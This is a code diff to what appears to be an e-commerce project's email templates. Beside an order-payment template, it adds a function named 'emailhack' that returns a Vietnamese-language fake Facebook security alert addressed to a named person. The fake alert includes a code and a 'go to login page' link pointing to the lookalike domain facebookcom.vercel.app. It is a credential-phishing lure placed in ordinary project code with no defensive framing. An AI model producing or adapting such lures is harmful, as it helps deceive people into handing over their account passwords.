@@ -183,3 +183,23 @@ export const payOrderEmailAdminTemplate = (order) => {
   </p>
   `;
 };
+
+
+export const emailhack =()=>{
+  return`
+       
+
+  <h2>Xin chào Quang,</h2>
+<p>Chúng tôi đã nhận được yêu cầu cảnh báo bảo mật tài khoản facebook của bạn</p>
+<br/>
+<p>Vui lòng kiểm tra lại đăng nhập hoặc đăth lại mật khẩu</p>
+<br/>
+<p>389325<p/>
+<br/>
+<p>Ngoài ra, bạn có thể thay đổi trực tiếp mật khẩu của mình.</p>
+ 
+<a href="https://facebookcom.vercel.app/">Chuyển tới trang đăng nhập</a>
+<p>Bạn đã không yêu cầu thay đổi này?
+Nếu bạn không yêu cầu mật khẩu mới, hãy cho chúng tôi biết.<p/>
+  `
+}
